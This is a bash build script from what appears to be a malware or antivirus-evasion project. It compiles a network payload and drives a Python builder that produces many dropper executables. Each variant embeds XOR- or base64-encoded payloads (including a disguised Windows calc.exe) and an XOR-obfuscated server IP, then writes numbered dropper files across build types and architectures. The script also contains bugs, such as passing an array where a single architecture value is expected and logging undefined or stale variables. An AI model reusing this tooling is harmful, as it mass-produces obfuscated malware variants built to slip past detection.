# Controls how many times the python file is run.
build_types=(release debug)
architecture=(x86 x64)
encoding=(both xor base64)
arr=( $(shuf -i 0-255 -n 3) )
both_arr=( $(shuf -i 0-255 -n 3) )

# All flags that the python file will get
input="FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp"
# No file extension because this uses string interpolation
#because there will be multiple different output files
#The c++ file adds the .exe by default
out="all_exe_combinations/exe_num"
resource="FileSystem_exe_rebuild/Resource.rc"
header="FileSystem_exe_rebuild/resource.h"
encode1="FileSystem_exe_rebuild/payloads/network_payload.exe"
# This is compiled and then the exe is deleted 
# because github was being problematic about the 
# file size.
encode2="FileSystem_exe_rebuild/payloads/en-US/w7_calc.exe.mui"
encode3="FileSystem_exe_rebuild/payloads/w7_calc.exe"
log_out="preserve_payload_contents.txt"
manual_debug_run=false
i=0
print_log=""
server_ip="192.168.79.139"
server_ip_xor_key=32

encode1_output="${encode1%.*}.cpp"
x86_64-w64-mingw32-g++ "$encode1_output" -static -static-libgcc -static-libstdc++ -o "$encode1" -lws2_32

#reset logging
python3 linux_mint_script.py --hardcode --no_encode --no_decode --no_compile --logging_output "$log_out"

# This file runs all combinations of release file

for build in "${build_types[@]}"; do
	for arch in "${architecture[@]}"; do
		for enc in "${encoding[@]}"; do


			if [[ "$enc" == "both" ]]; then
				for a_idx in "${arr[@]}"; do
					print_log+="\nRun number $i:\n"
					print_log+="---------------------Run Details----------------------\n"
					print_log+="Build type: $build\n"
					print_log+="Architecture: $arch\n"
					print_log+="Encoding: $enc\n"
					print_log+="xor_key: $a_idx\n"

					print_log+="input: $input\n"
					print_log+="output: ${out}${i}.exe\n"
					print_log+="resource: $resource\n"
					print_log+="header: $header\n"
					print_log+="encode: $encode\n"
					print_log+="server ip: $server_ip\n"
					print_log+="server ip xor key: $server_ip_xor_key\n"

				print_log+="---------------------Python file size Details----------------------\n"
					print_log+="input size: $(wc -c < $input)\n"
					print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
					print_log+="resource size: $(wc -c <$resource)\n"
					print_log+="header size: $(wc -c < $header)\n"
					print_log+="encode1 size: $(wc -c <$encode1)\n"
					print_log+="encode2 size: $(wc -c <$encode2)\n"

					python3 linux_mint_script.py --hardcode \
					"--$build" "--$architecture" \
					--xor_key "$a_idx" --base64 \
					--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"

					print_log+="---------------------After Python file size Details----------------------\n"
					print_log+="input size: $(wc -c < $input)\n"
					print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
					print_log+="resource size: $(wc -c <$resource)\n"
					print_log+="header size: $(wc -c < $header)\n"
					print_log+="encode1 size: $(wc -c <$encode1)\n"
					print_log+="encode2 size: $(wc -c <$encode2)\n"

					i=$((i + 1))
				done
			fi


			if [[ "$enc" == "xor" ]]; then
				for a_idx in "${both_arr[@]}"; do

					print_log+="\nRun number $i:\n"
					print_log+="---------------------Run Details----------------------\n"
					print_log+="Build type: $build\n"
					print_log+="Architecture: $arch\n"
					print_log+="Encoding: $enc\n"
					print_log+="xor_key: $a_idx\n"

					print_log+="input: $input\n"
					print_log+="output: ${out}${i}.exe\n"
					print_log+="resource: $resource\n"
					print_log+="header: $header\n"
					print_log+="encode1: $encode1\n"
					print_log+="encode2: $encode2\n"
					print_log+="server ip: $server_ip\n"
					print_log+="server ip xor: $server_ip_xor_key"

					print_log+="---------------------Python file size Details----------------------\n"
					print_log+="input size: $(wc -c < $input)\n"
					print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
					print_log+="resource size: $(wc -c <$resource)\n"
					print_log+="header size: $(wc -c < $header)\n"
					print_log+="encode size1: $(wc -c <$encode1)\n"
					print_log+="encode size2: $(wc -c <$encode2)\n"

					python3 linux_mint_script.py --hardcode \
					"--$build" "--$architecture" \
				        --xor_key "$a_idx" \
					--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"

					print_log+="---------------------After Python file size Details----------------------\n"
					print_log+="input size: $(wc -c < $input)\n"
					print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
					print_log+="resource size: $(wc -c <$resource)\n"
					print_log+="header size: $(wc -c < $header)\n"
					print_log+="encode1 size: $(wc -c <$encode1)\n"
					print_log+="encode2 size: $(wc -c <$encode2)\n"

					i=$((i + 1))
				done
			fi


			if [[ "$enc" == "base64" ]]; then

				print_log+="\nRun number $i:\n"
				print_log+="---------------------Run Details----------------------\n"
				print_log+="Build type: $build\n"
				print_log+="Architecture: $arch\n"
				print_log+="Encoding: $enc\n"
				print_log+="xor_key: $a_idx\n"

				print_log+="input: $input\n"
				print_log+="output: ${out}${i}.exe\n"
				print_log+="resource: $resource\n"
				print_log+="header: $header\n"
				print_log+="encode1: $encode1\n"
				print_log+="encode2: $encode2\n"
				print_log+="server ip: $server_ip\n"
				print_log+="server ip xor key: $server_ip_xor_key\n"

				print_log+="---------------------Python file size Details----------------------\n"
				print_log+="input size: $(wc -c < $input)\n"
				print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
				print_log+="resource size: $(wc -c <$resource)\n"
				print_log+="header size: $(wc -c < $header)\n"
				print_log+="encode1 size: $(wc -c <$encode1)\n"
				print_log+="encode2 size: $(wc -c <$encode2)\n"

				python3 linux_mint_script.py --hardcode \
				"--$build" "--$architecture" \
				--base64 \
				--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
				--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"

				print_log+="---------------------After Python file size Details----------------------\n"
				print_log+="input size: $(wc -c < $input)\n"
				print_log+="output size: $(wc -c < ${out}${i}.exe)\n"
				print_log+="resource size: $(wc -c <$resource)\n"
				print_log+="header size: $(wc -c < $header)\n"
				print_log+="encode1 size: $(wc -c <$encode1)\n"
				print_log+="encode2 size: $(wc -c <$encode2)\n"

				i=$((i + 1))
			fi

			print_log+="\n"
		done
	done
done

printf "$print_log">log_file.txt

rm "$encode1"

echo "payloads can be restored by using git restore. You can change the ip address in the script_runners.sh file"
